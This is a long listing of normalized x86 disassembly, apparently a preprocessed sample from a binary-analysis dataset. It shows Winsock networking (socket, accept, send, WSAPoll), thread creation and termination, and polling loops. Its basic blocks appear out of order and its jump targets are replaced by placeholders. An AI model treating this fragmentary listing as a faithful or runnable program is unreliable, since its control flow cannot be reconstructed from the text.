mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x34 ]
add esi esi
add esi esi
add esi esi
mov eax 0x300
test [ ecx + esi + 0x6 ] ax
je r-xdata
jmp r-xdata
mov eax [ esi + 0xc ]
add eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
mov edi eax
shr edi 0x2
mov [ esp + 0x38 ] eax
cmp ecx edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
lea edi [ esp + 0xc8 ]
mov esi ebx
mov [ esp + 0xc8 ] edx
mov [ esp + 0xcc ] 0x0
call sub_404870
mov ecx [ esp + 0x18 ]
push ecx
push ebx
lea esi [ esp + 0x90 ]
call sub_4043c0
mov eax [ esp + 0x88 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
xor esi esi
mov [ esp + 0x20 ] esi
cmp ebx esi
je r-xdata
push 0x0
push 0x4
lea eax [ esp + 0x18 ]
push eax
push edi
call [ send@IAT ]
jmp r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi ecx
mov ebx esi
call sub_403e30
mov ebx [ esp + 0x1c ]
mov ecx [ ebx + 0x4 ]
movzx edx [ esp + 0x20 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x18 ] edx
mov [ esp + 0x28 ] ecx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
movzx edx [ esp + 0x20 ]
mov [ esp + 0x18 ] ecx
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ esp + 0x18 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi [ esp + 0x24 ]
lea eax [ esp + 0x180 ]
mov ecx esi
call sub_403e10
mov ecx [ eax ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov edx [ esp + 0x28 ]
push 0x0
mov ecx ebx
sub ecx esi
push ecx
lea eax [ esi + edx ]
push eax
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
cmp eax 0x4
je r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + edi * 4 ]
and eax 0x3
lea eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
push 0x10
call sub_4049d7
add esp 0x4
test eax eax
je r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
nop
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov edi [ ecx ]
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x20 ]
add ecx 0x2
mov [ esp + 0x20 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
inc [ esi + 0x10 ]
mov eax [ ebx + 0x9c ]
mov ecx [ ebx + 0x98 ]
lea esi [ ebx + 0x8c ]
add ecx eax
test cl 0x3
jne r-xdata
mov edx [ esp + 0x20 ]
mov [ eax ] edx
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x15c ]
mov [ esp + 0x14 ] 0x0
call sub_404adf
push r--data
lea edx [ esp + 0x15c ]
push edx
mov [ esp + 0x160 ] r--data
call sub_405255
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
mov eax [ esp + 0x38 ]
mov eax edx
lea edi [ esp + 0x138 ]
mov esi ebx
mov [ esp + 0x138 ] eax
mov [ esp + 0x13c ] 0x0
call sub_404870
mov ecx [ esp + 0x28 ]
push ecx
push ebx
lea esi [ esp + 0x8c ]
call sub_4043c0
mov eax [ esp + 0x84 ]
mov edx [ esp + 0x18 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea edi [ esp + 0xd8 ]
mov esi ebx
mov [ esp + 0xd8 ] edx
mov [ esp + 0xdc ] 0x0
call sub_404870
mov edx [ esp + 0x18 ]
push edx
push ebx
lea esi [ esp + 0x64 ]
call sub_4043c0
mov eax [ esp + 0x5c ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
push ecx
call sub_404f01
mov eax [ esi + 0x10 ]
add esp 0x4
cmp eax ebx
je r-xdata
sub eax edx
mov ecx [ eax + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edx eax
ja r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi ebx
jne r-xdata
mov eax [ esi + 0xc ]
add eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
mov edi eax
shr edi 0x2
mov [ esp + 0x38 ] eax
cmp ecx edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
mov eax ebx
cmp ebx ecx
je r-xdata
nop
mov ecx [ esp + 0x24 ]
add ecx 0xfffffffe
add [ eax + 0x10 ] ecx
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ebx ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ esp + 0x28 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ eax + 0x10 ] 0x0
mov [ esp + 0x18 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
je r-xdata
mov edx [ esi + 0x8 ]
inc [ esi + 0xc ]
add edx edx
add edx edx
cmp edx [ esi + 0xc ]
ja r-xdata
je r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi ecx
mov ebx esi
call sub_403e30
mov ebx [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0xe8 ]
mov [ esp + 0xe8 ] ecx
mov [ esp + 0xec ] 0x0
call sub_404870
push ebx
push esi
lea esi [ esp + 0x6c ]
call sub_4043c0
mov eax [ esp + 0x64 ]
mov edx [ esp + 0x18 ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov esi [ eax + 0x8 ]
inc [ eax + 0xc ]
add esi esi
add esi esi
cmp esi [ eax + 0xc ]
ja r-xdata
dec eax
mov [ esi + 0x10 ] eax
cmp eax ebx
jne r-xdata
mov [ esi + 0xc ] ebx
mov edx [ esi + 0x4 ]
mov ecx [ edx + edi * 4 ]
and eax 0x3
lea eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
push 0x10
call sub_4049d7
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ebx ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edx + 0xa4 ]
mov cx [ esp + 0x20 ]
mov [ eax + 0xa ] cx
mov edi edx
cmp [ eax + 0x10 ] 0x0
ja r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
dec ecx
mov [ eax + 0x10 ] ecx
jne r-xdata
mov [ eax + 0xc ] ebx
mov [ esi + 0xc ] ebx
mov eax 0x1
add [ esi + 0x10 ] eax
cmp [ esp + 0x24 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
add ecx 0x2
mov [ eax ] ecx
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x168 ]
mov [ esp + 0x14 ] 0x0
call sub_404adf
push r--data
lea ecx [ esp + 0x168 ]
push ecx
mov [ esp + 0x16c ] r--data
call sub_405255
int3
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
mov eax [ esp + 0x38 ]
mov eax ebx
cmp ebx ecx
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov edx [ edi + 0xa4 ]
mov esi [ esp + 0x20 ]
inc [ esp + 0x4c ]
push edx
push edi
call sub_403000
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
push 0x1388
push 0x1
lea edx [ esp + 0x4c ]
mov ecx 0x300
push edx
mov [ esp + 0x30 ] 0x10
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] cx
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx + 0xc ] ebx
mov eax [ esp + 0x20 ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0x118 ]
mov [ esp + 0x118 ] ecx
mov [ esp + 0x11c ] 0x0
call sub_404870
push ebx
push esi
lea esi [ esp + 0x84 ]
call sub_4043c0
mov eax [ esp + 0x7c ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edi [ esp + 0x1c ]
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ebx ecx
jne r-xdata
lea esp [ esp ]
mov edx [ esp + 0x34 ]
mov edi [ edx ]
push 0x7d0
push 0x1
lea ecx [ esp + 0xbc ]
mov eax 0x10
push ecx
mov [ esp + 0x44 ] 0x3
mov [ esp + 0xc0 ] edi
mov [ esp + 0xc4 ] ax
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
mov [ esp + 0x24 ] 0xfffffffe
test [ esp + 0xae ] 0x10
je r-xdata
mov ebx [ eax + 0x10 ]
mov edx [ esp + 0x14 ]
push 0x7d0
push 0x1
lea ecx [ esp + 0xb0 ]
mov eax 0x10
push ecx
mov [ esp + 0x2c ] edx
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xb8 ] ax
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp ebx ecx
je r-xdata
mov edx [ eax + 0xc ]
cmp edx [ esp + 0x18 ]
jge r-xdata
cmp ebx ecx
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ esp + 0x14 ]
mov edx [ ebx + 0x10 ]
mov eax [ ecx + 0x4 ]
add edi edi
cmp [ eax + 0x15 ] 0x0
movzx esi [ edx + edi - 0x2 ]
mov [ esp + 0x14 ] edi
mov edx ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
test [ esp + 0xba ] 0x10
je r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov edi [ send@IAT ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0x130 ]
mov [ esp + 0x130 ] ecx
mov [ esp + 0x134 ] 0x0
call sub_404870
mov edx esi
push ebx
push edx
lea esi [ esp + 0x98 ]
call sub_4043c0
mov ebx [ esp + 0x90 ]
mov edi [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
cmp eax [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0x120 ]
mov [ esp + 0x120 ] ecx
mov [ esp + 0x124 ] 0x0
call sub_404870
mov edx esi
push ebx
push edx
lea esi [ esp + 0xb8 ]
call sub_4043c0
mov ebx [ esp + 0xb0 ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax edx
cmp edx ecx
je r-xdata
lea ecx [ ecx ]
cmp eax 0x4
je r-xdata
mov eax [ esp + 0x18 ]
lea edi [ esp + 0x150 ]
mov esi ebx
mov [ esp + 0x150 ] eax
mov [ esp + 0x154 ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push ebx
lea esi [ esp + 0xa0 ]
call sub_4043c0
mov eax [ esp + 0x98 ]
mov edx [ esp + 0x18 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
cmp eax 0x4
je r-xdata
mov eax [ edi + 0x14 ]
lea esi [ edi + 0x10 ]
lea ecx [ esp + 0x20 ]
cmp ecx eax
jae r-xdata
cmp [ ebx + 0x10 ] 0x0
jbe r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp ebx ecx
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov edx [ esp + 0x40 ]
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x1a8 ]
push ecx
push edx
call [ accept@IAT ]
mov edx [ esp + 0x18 ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ebx ecx
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ esp + 0x148 ] esi
lea edi [ esp + 0x148 ]
mov esi ebx
mov [ esp + 0x14c ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push ebx
lea esi [ esp + 0x68 ]
call sub_4043c0
mov eax [ esp + 0x60 ]
mov edi [ esp + 0x14 ]
cmp esi [ edx + 0xc ]
jge r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
xor esi esi
mov [ esp + 0x10 ] esi
push 0x0
push 0x4
lea edx [ esp + 0x40 ]
push edx
push edi
call [ send@IAT ]
jmp r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
lea ecx [ ecx ]
mov ecx [ esp + 0x24 ]
add [ eax + 0x10 ] ecx
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
mov [ esp + 0x10 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
xor esi esi
mov [ esp + 0x28 ] esi
cmp [ esp + 0x14 ] esi
je r-xdata
push 0x0
push 0x4
lea edx [ esp + 0x28 ]
push edx
push ebx
call edi
jmp r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0xf8 ]
mov [ esp + 0xf8 ] ecx
mov [ esp + 0xfc ] 0x0
call sub_404870
mov edx esi
push ebx
push edx
lea esi [ esp + 0x74 ]
call sub_4043c0
mov ebx [ esp + 0x6c ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax edx
cmp edx ecx
je r-xdata
mov edi edi
mov edx [ eax + 0x10 ]
push edx
call [ closesocket@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x4 ]
movzx esi [ eax + edi - 0x2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov edx ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0xc ] esi
jge r-xdata
mov [ esp + 0x10 ] edx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esp + 0x10 ]
add ecx 0x2
mov [ esp + 0x10 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
mov edx [ esp + 0x18 ]
lea edi [ esp + 0x128 ]
mov esi ebx
mov [ esp + 0x128 ] edx
mov [ esp + 0x12c ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push ebx
lea esi [ esp + 0x5c ]
call sub_4043c0
mov eax [ esp + 0x54 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ esp + 0x24 ] esi
jmp r-xdata
nop
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x1
cmp eax 0x7ffffffe
ja r-xdata
mov ebx ecx
mov ecx [ esi + 0x8 ]
sub ebx edx
sar ebx 0x1
cmp eax ecx
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ esp + 0x28 ]
mov ecx eax
inc eax
mov [ esp + 0x28 ] eax
cmp ecx 0x2710
jg r-xdata
cmp [ ebx + 0x10 ] 0x0
ja r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ esp + 0xd0 ] esi
lea edi [ esp + 0xd0 ]
mov esi ebx
mov [ esp + 0xd4 ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push ebx
lea esi [ esp + 0x70 ]
call sub_4043c0
mov eax [ esp + 0x68 ]
mov edi [ esp + 0x14 ]
cmp esi [ edx + 0xc ]
jge r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi 0x3
jne r-xdata
mov edx [ esp + 0x24 ]
add [ eax + 0x10 ] edx
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ esp + 0x10 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ebx [ esp + 0x1c ]
mov ecx [ ebx + 0x34 ]
mov eax [ ecx + 0x4 ]
mov edx [ esp + 0x18 ]
add ebx 0x30
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ecx [ esp + 0x28 ]
add ecx 0x2
mov [ esp + 0x28 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
add [ esi + 0x4 ] 0x2
mov ebx [ edi + 0x34 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ecx [ esp + 0x18 ]
lea esi [ edi + 0x30 ]
jne r-xdata
mov dx [ esp + 0x20 ]
mov [ eax ] dx
push r--data
call sub_4048f7
sub ecx edx
inc eax
sar ecx 0x1
cmp eax ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x1
cmp eax 0x7ffffffe
ja r-xdata
mov edx [ esp + 0x40 ]
push 0x1388
push 0x1
lea ecx [ esp + 0x4c ]
mov eax 0x300
push ecx
mov [ esp + 0x50 ] edx
mov [ esp + 0x54 ] ax
call [ WSAPoll@IAT ]
test eax eax
jg r-xdata
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
lea esp [ esp ]
mov [ eax + 0x10 ] 0xffffffff
mov ecx [ ebx + 0x24 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov edx [ ebx + 0x10 ]
movzx edx [ edx + edi - 0x2 ]
lea esi [ ebx + 0x20 ]
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0xc ] esi
jge r-xdata
mov [ esp + 0x10 ] edx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esp + 0x20 ]
push 0x0
mov eax 0x3
sub eax esi
push eax
add ecx esi
push ecx
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
je r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
mov eax ebx
cmp ebx [ esi + 0x4 ]
je r-xdata
lea esp [ esp ]
mov edx ecx
shr edx 0x1
mov ebx 0x7fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov cx [ edx + ebx * 2 ]
mov [ eax ] cx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x1
cmp eax ecx
jbe r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov edx [ esp + 0x18 ]
mov ebx ecx
jne r-xdata
lea edi [ esp + 0xe0 ]
mov [ esp + 0xe0 ] edx
mov [ esp + 0xe4 ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push esi
lea esi [ esp + 0x78 ]
call sub_4043c0
mov eax [ esp + 0x70 ]
mov edi [ esp + 0x14 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push 0x0
sub eax esi
push eax
lea edx [ esi + ecx + 0x2 ]
push edx
push ebx
call edi
test eax eax
jle r-xdata
mov [ esp + 0x24 ] 0x0
jmp r-xdata
je r-xdata
mov eax [ esp + 0x18 ]
lea edi [ esp + 0x108 ]
mov [ esp + 0x108 ] eax
mov [ esp + 0x10c ] 0x0
call sub_404870
push ebx
push esi
lea esi [ esp + 0x7c ]
call sub_4043c0
mov eax [ esp + 0x74 ]
mov edi [ esp + 0x1c ]
cmp ecx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov edi 0x7fffffff
sub edi edx
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x4 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov ecx [ ebx + 0x34 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov edx [ ebx + 0x10 ]
movzx edx [ edx + edi - 0x2 ]
lea esi [ ebx + 0x30 ]
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ esp + 0x10 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ esp + 0x24 ] 0xffffffff
jmp r-xdata
mov eax ebx
cmp ebx ecx
je r-xdata
mov edi edi
mov edx [ esp + 0x18 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov ebx ecx
jne r-xdata
cmp [ eax + 0xc ] ecx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ecx
call sub_403d00
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
lea edi [ esp + 0xf0 ]
mov [ esp + 0xf0 ] edx
mov [ esp + 0xf4 ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push esi
lea esi [ esp + 0x58 ]
call sub_4043c0
mov ecx [ esp + 0x50 ]
mov edi [ esp + 0x14 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
lea edi [ esp + 0x140 ]
mov [ esp + 0x140 ] ecx
mov [ esp + 0x144 ] 0x0
call sub_404870
push ebx
push esi
lea esi [ esp + 0xac ]
call sub_4043c0
mov eax [ esp + 0xa4 ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
push ecx
call sub_403d00
mov edi [ esp + 0x1c ]
mov ecx eax
cmp ecx eax
jae r-xdata
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
lea esp [ esp ]
mov [ ecx + 0x10 ] 0x0
mov ecx [ ebx + 0x44 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov edx [ ebx + 0x10 ]
movzx edx [ edx + edi - 0x2 ]
lea esi [ ebx + 0x40 ]
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
test [ esp + 0xa2 ] 0x10
je r-xdata
mov edi [ eax + 0x10 ]
mov ebx [ esp + 0x14 ]
push 0x7d0
push 0x1
lea eax [ esp + 0xa4 ]
mov edx 0x10
push eax
mov [ esp + 0x20 ] ebx
mov [ esp + 0xa8 ] edi
mov [ esp + 0xac ] dx
call [ WSAPoll@IAT ]
test eax eax
jle r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ esp + 0x100 ]
mov [ esp + 0x100 ] edx
mov [ esp + 0x104 ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
push esi
lea esi [ esp + 0x88 ]
call sub_4043c0
mov eax [ esp + 0x80 ]
mov edi [ esp + 0x14 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ esp + 0x10 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi [ send@IAT ]
lea ebx [ ebx ]
mov eax [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ eax ]
push ecx
call sub_404f01
mov edx [ esp + 0x14 ]
add esp 0x4
push edx
call sub_4049cc
add esp 0x4
mov esi [ eax + 0x10 ]
lea edx [ esp + 0x8c ]
push edx
push esi
call [ GetExitCodeThread@IAT ]
mov eax [ esp + 0x8c ]
push eax
push esi
call [ TerminateThread@IAT ]
push esi
call [ CloseHandle@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + edi - 0x2 ]
mov [ esp + 0x38 ] edx
lea eax [ ebx + 0x50 ]
lea edx [ esp + 0x38 ]
call sub_403bc0
mov esi [ eax ]
mov eax [ esi ]
push eax
call [ closesocket@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ closesocket@IAT ]
mov edx [ esi + 0x10 ]
push edx
call sub_4049cc
mov eax [ esi + 0xc ]
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ esp + 0x10 ] ecx
cmp [ eax + 0x15 ] 0x0
je r-xdata
xor esi esi
mov [ esp + 0x28 ] esi
cmp ebx esi
je r-xdata
push 0x0
push 0x4
lea ecx [ esp + 0x1c ]
push ecx
push edi
call esi
jmp r-xdata
push esi
call sub_4049cc
mov eax [ ebx + 0x10 ]
mov edx [ ebx + 0x14 ]
add eax edi
add eax 0xfffffffe
lea ecx [ eax + 0x2 ]
sub edx ecx
sar edx 0x1
add esp 0x4
add edx edx
push edx
push ecx
push eax
call sub_404ba0
add esp 0xc
add [ ebx + 0x14 ] 0xfffffffe
jmp r-xdata
mov ecx [ eax ]
push ecx
call sub_404f01
mov edx [ esp + 0x14 ]
add esp 0x4
push edx
call sub_4049cc
add esp 0x4
mov eax [ esp + 0x10 ]
push 0x0
mov edx ebx
sub edx esi
push edx
lea ecx [ esi + eax + 0x2 ]
push ecx
push edi
call [ send@IAT ]
test eax eax
jle r-xdata
cmp eax 0x4
je r-xdata
mov ecx [ esp + 0x28 ]
add ecx 0x2
mov [ esp + 0x28 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
je r-xdata
sub_403000
push ebp
mov ebp esp
push 0xffffffff
push sub_40a8eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x14
call sub_4049d7
mov edi eax
add esp 0x4
mov [ ebp - 0x14 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx esi si
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi + 0x50 ]
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
call sub_403bc0
mov [ eax ] ebx
lea edx [ ebp + 0xc ]
lea eax [ edi + 0x40 ]
mov [ ebp + 0xc ] esi
call sub_403bc0
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push ebx
push sub_402fe0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
lea edx [ ebp + 0xc ]
lea eax [ edi + 0x40 ]
mov [ ebp + 0xc ] esi
call sub_403bc0
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_401930
mov ebx eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4030e0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x6c ]
push ebx
push edi
push eax
xor edi edi
call [ closesocket@IAT ]
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
